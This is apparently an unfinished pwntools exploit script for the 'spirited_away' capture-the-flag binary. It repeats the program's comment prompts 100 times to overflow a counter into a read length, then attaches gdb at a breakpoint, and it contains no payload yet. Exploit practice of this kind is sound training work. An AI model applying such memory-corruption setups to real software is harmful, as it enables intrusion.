from pwn import *
context.binary = './spirited_away'
context.log_level = 'debug'
context.timeout = None
elf = context.binary
libc = context.binary.libc
p = process('./spirited_away',  stdin=PTY)

def dbg():
	raw_input()

def onetime(name, age, reason, comment, next):
	p.recvuntil('Please enter your name: ')
	p.sendline(name)
	p.recvuntil('Please enter your age: ')
	p.sendline(str(age))
	p.recvuntil('Why did you came to see this movie? ')
	p.sendline(reason)
	p.recvuntil('Please enter your comment: ')
	p.sendline(comment)
	p.recvuntil('Would you like to leave another comment? <y/n>: ')
	p.sendline(next)


#cnt 2 number overwrite nbytes
cnt = 100
while cnt:
	onetime('a', 12, 'b', 'c', 'y')
	cnt -= 1

gdb.attach(p, 'b* 0x0804862A')
dbg()

onetime('name', 13, 'son', 'comment', 'y')
dbg()

p.interactive()
p.close()




